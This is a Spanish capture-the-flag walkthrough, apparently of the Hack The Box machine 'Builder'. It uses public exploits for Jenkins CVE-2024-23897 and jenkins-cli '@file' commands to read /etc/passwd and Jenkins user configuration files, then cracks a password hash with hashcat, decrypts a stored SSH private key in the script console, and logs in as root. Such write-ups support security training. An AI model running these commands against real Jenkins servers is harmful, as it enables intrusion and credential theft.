
---
# Resolución de la maquina **BUILDER**
---

- Empezamos creando nuestras carpetas que contengan nuestros registros de nmap, scripts, exploits, content.
```
mkt
```

- Ingresamos a nuestra carpeta de nmap y realizamos un ping y escaneo a la red.
```
ping -c 1 10.10.11.10
```
- Con el siguiente comando registraremos la información en el archivo allPorts
```
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.11.10 -oG allPorts
```

Desglosemos la línea de comandos:

1. `nmap`: Este es el comando principal que invoca Nmap, una herramienta de código abierto para la exploración de redes y auditoría de seguridad.
    
2. `-p-`: Esto le dice a Nmap que escanee todos los puertos (1-65535). El guion ("dash") indica un rango de puertos.
    
3. `-sS`: Especifica el tipo de escaneo a realizar, en este caso, un escaneo de tipo TCP SYN (SYN scan). Este tipo de escaneo envía un paquete SYN al puerto de destino y espera una respuesta SYN/ACK si el puerto está abierto.
    
4. `--open`: Esta opción indica a Nmap que solo muestre los puertos que están abiertos en el escaneo.
    
5. `--min-rate 5000`: Esto establece la velocidad mínima de envío de paquetes. En este caso, se están enviando al menos 5000 paquetes por segundo.
    
6. `-vvv`: Esta opción activa el modo de verbosidad máximo, lo que significa que Nmap proporcionará una salida muy detallada, mostrando incluso información de depuración adicional.
    
7. `-n`: Indica a Nmap que no realice resolución de DNS inversa en las direcciones IP encontradas durante el escaneo.
    
8. `-Pn`: Esta opción le dice a Nmap que no realice la detección de hosts, lo que significa que no intentará determinar si el host objetivo está activo antes de realizar el escaneo.
    
9. `10.10.11.10`: Esta es la dirección IP del host que se va a escanear.
    
10. `-oG allPorts`: Especifica el formato de salida del escaneo. En este caso, la opción `-oG` genera una salida en formato "greppable" que puede ser procesada posteriormente con herramientas como grep. El archivo de salida se llamará "allPorts".

- Ahora con la herramienta **extractPorts** usamos el archivo grepeaple.
```
extractPorts allPorts
```

- Realizamos un escaneo con **nmap** a los puertos detectados en la dirección ip destino.
```
nmap -p22,8080 -sCV 10.10.11.10 -oN targeted 
```

- `-p22,8080`: Esta opción especifica los puertos que se van a escanear. En este caso, se están escaneando los puertos 22 (utilizado comúnmente para SSH) y 8080 (a menudo utilizado para servicios web alternativos u otros fines).
    
- `-sC`: Esta opción activa el script predeterminado de escaneo y detección de versiones. Esto significa que Nmap ejecutará una serie de scripts integrados para detectar versiones de servicios y obtener información adicional sobre ellos.
    
- `-sV`: Esta opción solicita a Nmap que realice la detección de versiones en los servicios que descubre durante el escaneo de puertos. Esto significa que intentará determinar qué versiones de software están siendo ejecutadas en los puertos abiertos.
    
- `10.10.11.10`: Esta es la dirección IP del objetivo que se está escaneando. En este caso, el escaneo de puertos y servicios se realizará en el dispositivo con la dirección IP 10.10.11.10.
    
- `-oN targeted`: Esta opción especifica el formato y el nombre del archivo de salida del escaneo. En este caso, el resultado se guardará en un archivo llamado "targeted" en un formato específico que se puede procesar posteriormente.

- Ya con esta información podríamos investigar mas con la información que nos muestra con la versión del Ubuntu
**OpenSSH 8.9p1 Ubuntu 3ubuntu0.6**
- Investigando con la página **launchpad** nos damos cuenta que estamos con la versión Jammy de Ubuntu 
**JAMMY**
- El siguiente comando nos permite ver el contenido de manera java 
```
cat targeted -l java
```

- A continuación empezamos a utilizar la herramienta **whatweb**
```
whatweb http://10.10.11.10:8080
```

- Con el siguiente comando podemos escanear las directorios existentes con la herramienta de **nmap**
```
nmap --script http-enum -p8080 10.10.11.10 -oN webScan
```

- `--script http-enum`: Esta opción indica a Nmap que ejecute el script `http-enum` durante el escaneo. Este script se utiliza para identificar y enumerar recursos y directorios en un servidor web que responde a peticiones HTTP. La enumeración de estos recursos puede revelar información sobre la estructura del sitio web y posiblemente exponer puntos de entrada para posibles vulnerabilidades.
    
- `-p8080`: Esta opción especifica el puerto que se va a escanear. En este caso, estás escaneando el puerto 8080, que es comúnmente utilizado para servidores web alternativos o servicios web adicionales.
    
- `10.10.11.10`: Esta es la dirección IP del objetivo que se está escaneando. En este caso, el escaneo se realizará en el dispositivo con la dirección IP 10.10.11.10.
	
- `-oN`: Esta es una opción de Nmap que se utiliza para especificar el formato y el nombre del archivo de salida del escaneo.
    
- `webScan`: Este es el nombre del archivo de salida donde se guardarán los resultados del escaneo. En este caso, el archivo se llamará "webScan".

- A continuación podemos empezar a investigar la pagina web montada en el puerto 8080
- Vemos que es una pagina de **Jenkins** y podemos buscar en el navegador **default password** como **admin/password**
- Podemos observar la versión de **Jenkins** en la parte inferior y con esto podemos averiguar en internet un exploit en caso de que este desactualizado 
- Analizamos la pagina y encontramos que tiene información de usuarios pero no da mas información, así que nos dirigimos a nuestra carpeta de scripts
- Nos clonamos el repositorio de CVE-2024-23897
```
git clone https://github.com/h4x0r-dz/CVE-2024-23897.git
```
- Si realizamos un cat al archivo **CVE-2024-23897.py** podemos analizar un poco del script a utilizar 

- Utilizamos la siguiente linea para observar información en ciertas rutas
```
python3 CVE-2024-23897.py -u http://10.10.11.10:8080 -f /etc/group
```
- En ocasiones toca volver a enviar la petición para que muestre otros resultados

- Tambien tenemos otro exploit que nos trae de local el recurso
```
git clone https://github.com/CKevens/CVE-2024-23897.git
```

- Con este comando podemos ejecutar whoami por ejemplo
```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 who-am-i
```

- Si queremos leer archivos de una ruta podemos utilizar 
```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help @/etc/passwd
```

- Con este comando podemos enlistar mas información detallada
```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node @/etc/passwd
```

 - El comando ejecuta cada comando disponible en Jenkins, intenta obtener `/etc/passwd` con cada uno, y muestra el recuento de líneas de salida de cada intento.
```
for command in $(java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help 2>&1 | grep -v "    " | xargs | tr ' ' '\n'); do echo "[+] Para el comando $command: $(java -jar jenkins-cli.jar -s http://10.10.11.10:8080 $command @/etc/passwd 2>&1 | wc -l)"; done
```

- Despues de ver cual nos devuelve mas lineas, realizamos el siguiente comando para ver las rutas de cada nombre como **root, www-data, etc**
```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/etc/passwd 2>&1 | grep -oP "'.*?'"
```

- Este nos enlista las direcciones ip
```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/proc/net/fib_trie 2>&1 | grep -oP "'.*?'"
```

- Para ver la ruta completa al directorio de inicio del usuario en Builder que ejecuta Jenkins
```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/var/jenkins_home/user.txt 2>&1 | grep -oP "'.*?'"
```

- Ahora ejecutamos un contenedor docker de jenkins en nuestra terminal 
```
docker run -p 8080:8080 -p 50000:50000 --restart=on-failure -v jenkins_home:/var/jenkins_home jenkins/jenkins:lts-jdk17
```

- Una vez iniciado el docker podemos ingresar al navegador por el localhost:8080 eh ingresar la constrase que indica en la instalación
```
688ddaf7d99c4c5381e15cdadf43a63d
```
- Iniciar con la instalación
- Creamos el usuario y contraseña
- Con `docker ps | less -S` podemos observar el nombre de la maquina `great_meitner`
- Ahora para usar de manera interactiva el contenedor podemos usar el siguiente comando para usar una bash
```
docker exec -it great_meitner bash
```

- Para encontrar la contraseña debemos ingresar a `cd users` y buscar el directorio `sk8ware_10046583172681289229`, despues de eso revisamos el archivo `config.xml`.
- Después enviamos de nuevo el escript con la ruta encontrada para encontrar directorios `jennifer_12108429903186576833`
```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/var/jenkins_home/users/users.xml 2>&1 | grep -oP "'.*?'"
```

- Ahora revisamos la información de Jeniffer para ver el archivo config.xml, Con esto podremos ver una contraseña hasheada.
```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml.xml 2>&1 | grep -oP "'.*?'"
```

- Realizamos lo siguiente para crackiarla, creamos un archivo hash con nvim en la carpeta content, guardamos la contraseña hasheada y usamos la siguiente línea
```
hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
```
- En esta parte observamos la contraseña de jennifer y nos podemos logear con la contraseña princess
- Vamos a la parte de **Manaje Jenkins** y buscamos la parte de scripts
- Ahora si hace **Ctrl + Shift + C** e inspecionamos enconrtamos la **privateKey**
- Nos copiamos la privateKey y creamos un archivo data guardando la info

- Con el siguiente comando verificamos si esta codificado la información encontrada
```
cat data | tr -d '{}' | base64 -d
```

- Con la siguiente linea podemos decodificar en el script de Jenkins
```
println(hudson.util.Secret.decrypt("{}"))
```
- Esto mostrara la clave privada

- Creamos un archivo id_rsa con la contraseña privada 
```
nvim id_rsa
```
- Le otorgamos el permiso 600 `chmod 600 id_rsa`

- Finalmente nos conectamos por ssh para tener acceso a la maquina
```
ssh -i id_rsa root@10.10.11.10
```

- Con esto ya podrian ver la flag root.txt :)